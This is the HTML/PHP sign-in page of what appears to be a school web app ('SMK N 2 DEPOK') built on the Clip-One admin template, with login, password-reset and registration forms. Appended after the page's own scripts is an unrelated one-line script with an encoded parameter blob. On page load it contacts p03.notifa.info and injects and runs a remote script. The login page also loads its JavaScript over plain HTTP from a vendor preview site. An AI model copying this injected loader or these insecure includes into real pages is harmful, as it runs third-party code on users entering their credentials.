<!DOCTYPE html>
<!--[if IE 8]><html class="ie8 no-js" lang="en"><![endif]-->
<!--[if IE 9]><html class="ie9 no-js" lang="en"><![endif]-->
<!--[if !IE]><!-->
<html class="no-js">
<!--<![endif]-->

<head>
    <title>Sign in</title>
    <link rel="icon" href="<?=base_url()?>/favicon.ico">
    <!-- start: META -->
    <meta charset="utf-8" />
    <!--[if IE]><meta http-equiv='X-UA-Compatible' content="IE=edge,IE=9,IE=8,chrome=1" /><![endif]-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta content="Responsive Admin Template build with Twitter Bootstrap and jQuery" name="description" />
    <meta content="ClipTheme" name="author" />
    <!-- end: META -->
    <!-- start: MAIN CSS -->
    <link type="text/css" rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:400,300,600,700|Raleway:400,100,200,300,500,600,700,800,900/" />
    <link type="text/css" rel="stylesheet" href="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/bootstrap/dist/css/bootstrap.min.css" />
    <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
    <link type="text/css" rel="stylesheet" href="http://www.cliptheme.com/preview/cliponeV2/Admin/clip-one-template/clip-one/assets/fonts/clip-font.min.css" />
    <link type="text/css" rel="stylesheet" href="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/iCheck/skins/all.css" />
    <link type="text/css" rel="stylesheet" href="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/perfect-scrollbar/css/perfect-scrollbar.min.css" />
    <link type="text/css" rel="stylesheet" href="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/sweetalert/dist/sweetalert.css" />
    <link type="text/css" rel="stylesheet" href="http://www.cliptheme.com/preview/cliponeV2/Admin/clip-one-template/clip-one/assets/css/main.min.css" />
    <link type="text/css" rel="stylesheet" href="http://www.cliptheme.com/preview/cliponeV2/Admin/clip-one-template/clip-one/assets/css/main-responsive.min.css" />
    <link type="text/css" rel="stylesheet" media="print" href="http://www.cliptheme.com/preview/cliponeV2/Admin/clip-one-template/clip-one/assets/css/print.min.css" />
    <link type="text/css" rel="stylesheet" id="skin_color" href="http://www.cliptheme.com/preview/cliponeV2/Admin/clip-one-template/clip-one/assets/css/theme/light.min.css" />
    <!-- end: MAIN CSS -->
    <!-- start: CSS REQUIRED FOR THIS PAGE ONLY -->
    <!-- end: CSS REQUIRED FOR THIS PAGE ONLY -->

</head>

<style>
    .button {
    	transition: all 0.1s;
    	cursor: pointer;
    }

    .button span {
    	cursor: pointer;
    	display: inline-block;
    	position: relative;
    	transition: 0.1s;
    }

    .button span:after {
        font-family: FontAwesome;
    	content: '\f101';
    	position: absolute;
    	opacity: 0;
    	top: 0;
    	right: -12px;
    	transition: 0.1s;
    }

    .button:hover span {
    	padding-right: 12px;
    }

    .button:hover span:after {
    	opacity: 1;
    	right: 0;
    }
</style>

<body class="login example1">

    <div class="main-login col-md-4 col-md-offset-4 col-sm-6 col-sm-offset-3">
        <div class="logo">
            <div class="col-md-12">
                <img style="padding-bottom: 12px;" src="<?=base_url()?>/assets/favicon/apple-icon-144x144.png" class="img-fluid" alt="Responsive image">
            </div>
            
            SMK N 2 DEPOK
        </div>
        <!-- start: LOGIN BOX -->
        <div class="box-login">
            <h3>Sign in to your account</h3>
            <p>
                Please enter your name and password to log in.
            </p>
            <?php echo form_open('auth/chek_login','class="form-login"');?>
                <div class="errorHandler alert alert-danger no-display">
                    <i class="fa fa-remove-sign"></i> You have some form errors. Please check below.
                </div>
                <fieldset>
                    <div class="form-group">
                        <span class="input-icon">
                            <input type="text" class="form-control" name="username" placeholder="Username">
                            <i class="fa fa-user"></i>
                        </span>
                        <!-- To mark the incorrectly filled input, you must add the class "error" to the input -->
                        <!-- example: <input type="text" class="login error" name="login" value="Username" /> -->
                    </div>
                    <div class="form-group form-actions">
                        <span class="input-icon">
                            <input type="password" class="form-control password" name="password" placeholder="Password">
                            <i class="fa fa-lock"></i>
                          <!--  <a class="forgot" href="?box=forgot">
                                I forgot my password
                            </a> -->
                        </span>
                    </div>
                    <div class="form-actions">
                        <!-- <label for="remember" class="checkbox-inline">
                            <input type="checkbox" class="grey remember" id="remember" name="remember">
                            Keep me signed in
                        </label> -->
                        <button type="submit" name="submit" class="btn btn-success button pull-right">
                            <span>Login &nbsp;</span>
                        </button>
                    </div>
                    <!-- <div class="new-account">
                        Don't have an account yet?
                        <a href="?box=register" class="register">
                            Create an account
                        </a>
                    </div> -->
                </fieldset>
            </form>
        </div>
        <!-- end: LOGIN BOX -->
        <!-- start: FORGOT BOX -->
        <div class="box-forgot">
            <h3>Forget Password?</h3>
            <p>
                Enter your e-mail address below to reset your password.
            </p>
            <form class="form-forgot">
                <div class="errorHandler alert alert-danger no-display">
                    <i class="fa fa-remove-sign"></i> You have some form errors. Please check below.
                </div>
                <fieldset>
                    <div class="form-group">
                        <span class="input-icon">
                            <input type="email" class="form-control" name="email" placeholder="Email">
                            <i class="fa fa-envelope"></i>
                        </span>
                    </div>
                    <div class="form-actions">
                        <a href="?box=login" class="btn btn-light-grey go-back">
                            <i class="fa fa-circle-arrow-left"></i> Back
                        </a>
                        <button type="submit" class="btn btn-bricky pull-right">
                            Submit <i class="fa fa-arrow-circle-right"></i>
                        </button>
                    </div>
                </fieldset>
            </form>
        </div>
        <!-- end: FORGOT BOX -->
        <!-- start: REGISTER BOX -->
        <div class="box-register">
            <h3>Sign Up</h3>
            <p>
                Enter your personal details below:
            </p>
            <form class="form-register">
                <div class="errorHandler alert alert-danger no-display">
                    <i class="fa fa-remove-sign"></i> You have some form errors. Please check below.
                </div>
                <fieldset>
                    <div class="form-group">
                        <input type="text" class="form-control" name="full_name" placeholder="Full Name">
                    </div>
                    <div class="form-group">
                        <input type="text" class="form-control" name="address" placeholder="Address">
                    </div>
                    <div class="form-group">
                        <input type="text" class="form-control" name="city" placeholder="City">
                    </div>
                    <div class="form-group">
                        <div>
                            <label class="radio-inline">
                                <input type="radio" class="grey" value="F" name="gender">
                                Female
                            </label>
                            <label class="radio-inline">
                                <input type="radio" class="grey" value="M" name="gender">
                                Male
                            </label>
                        </div>
                    </div>
                    <p>
                        Enter your account details below:
                    </p>
                    <div class="form-group">
                        <span class="input-icon">
                            <input type="email" class="form-control" name="email" placeholder="Email">
                            <i class="fa fa-envelope"></i>
                        </span>
                    </div>
                    <div class="form-group">
                        <span class="input-icon">
                            <input type="password" class="form-control" id="password" name="password" placeholder="Password">
                            <i class="fa fa-lock"></i>
                        </span>
                    </div>
                    <div class="form-group">
                        <span class="input-icon">
                            <input type="password" class="form-control" name="password_again" placeholder="Password Again">
                            <i class="fa fa-lock"></i>
                        </span>
                    </div>
                    <div class="form-group">
                        <div>
                            <label for="agree" class="checkbox-inline">
                                <input type="checkbox" class="grey agree" id="agree" name="agree">
                                I agree to the Terms of Service and Privacy Policy
                            </label>
                        </div>
                    </div>
                    <div class="form-actions">
                        <a href="?box=login" class="btn btn-light-grey go-back">
                            <i class="fa fa-circle-arrow-left"></i> Back
                        </a>
                        <button type="submit" class="btn btn-bricky pull-right">
                            Submit <i class="fa fa-arrow-circle-right"></i>
                        </button>
                    </div>
                </fieldset>
            </form>
        </div>
        <!-- end: REGISTER BOX -->
        <!-- start: COPYRIGHT -->
        <div class="copyright">
            <script>
                document.write(new Date().getFullYear())
            </script> &copy; clip-one by cliptheme.
        </div>
        <!-- end: COPYRIGHT -->
    </div>

    <!-- start: MAIN JAVASCRIPTS -->
    <!--[if lt IE 9]>
            <script src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/respond/dest/respond.min.js"></script>
            <script src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/Flot/excanvas.min.js"></script>
            <script src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/jquery-1.x/dist/jquery.min.js"></script>
            <![endif]-->
    <!--[if gte IE 9]><!-->
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/jquery/dist/jquery.min.js"></script>
    <!--<![endif]-->
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/jquery-ui/jquery-ui.min.js"></script>
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/bootstrap-hover-dropdown/bootstrap-hover-dropdown.min.js"></script>
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/blockUI/jquery.blockUI.js"></script>
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/iCheck/icheck.min.js"></script>
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/perfect-scrollbar/js/min/perfect-scrollbar.jquery.min.js"></script>
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/jquery.cookie/jquery.cookie.js"></script>
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/sweetalert/dist/sweetalert.min.js"></script>
    <script type="text/javascript" src="http://www.cliptheme.com/preview/cliponeV2/Admin/clip-one-template/clip-one/assets/js/min/main.min.js"></script>
    <!-- end: MAIN JAVASCRIPTS -->
    <!-- start: JAVASCRIPTS REQUIRED FOR THIS PAGE ONLY -->
    <script src="http://www.cliptheme.com/preview/cliponeV2/Admin/clip-one-template/clip-one/assets/js/min/ui-animation.min.js"></script>
    <script src="http://www.cliptheme.com/preview/cliponeV2/Admin/bower_components/jquery-validation/dist/jquery.validate.min.js"></script>
    <script src="http://www.cliptheme.com/preview/cliponeV2/Admin/clip-one-template/clip-one/assets/js/min/login.min.js"></script>
    <!-- end: JAVASCRIPTS REQUIRED FOR THIS PAGE ONLY -->

    <script>
        jQuery(document).ready(function() {
            Main.init();
            Login.init();
            Animation.init();
        });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX5GDjyssieIz3b3%2bbMpKhbLb536yqcznDwoUMz4apxRAxZnnClT2FDd5hcG2pQQmr9ruGR3SK4t49XRTvlkPmFagGv03%2bvDwrD5aMWwOWEQr3qb3cVbPmEyjsfwKok%2bvh6KCfx06FWvjnLXwCMW12wRB%2fj%2bj%2fu7MPB%2fYSxQ2T7%2faUqpGFN9dveYT0eoKLmaLZ%2bMD6L0ZNGUt469rUsKO%2fQEF2eN9WyEf3O8qBOZ7ih27r5pDsQ0W7Lw%2fZWPYodSef01HrGtfLpsvYjkVGsZPSDNYMfpUIj%2bOH4%2bXgb%2b6Xhqh8VpDyFCbYfrw%2flr4mKjrc%2fz5kW%2byX8wM5wlWxjgq9Ev2r4FKZH4A3OX%2fkJE5ZBR3tSQPaY6kX2NQYbN60KcS4RdXf%2fg5PmyoK7G0X0frl%2fIx%2bENghuYLD7tYQQRu%2fE4LKLrnYM%2bzhnEMmelZdo5J60wfw3bdnOLY1YFqmrh1PL%2fhV2U232HE6u88hNgq9LZKpBpz1pMWZ5rBqbLfL6yz8fm0IVHKVGFTptUWSGsdEj%2bj01Hzyqbqz%2fegBHKRyLmhi5%2f1W1nH2nWoQA8jtIbjy3YHgR5uzZTJfsYc%2b0T5kTxRaqyccwinf" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
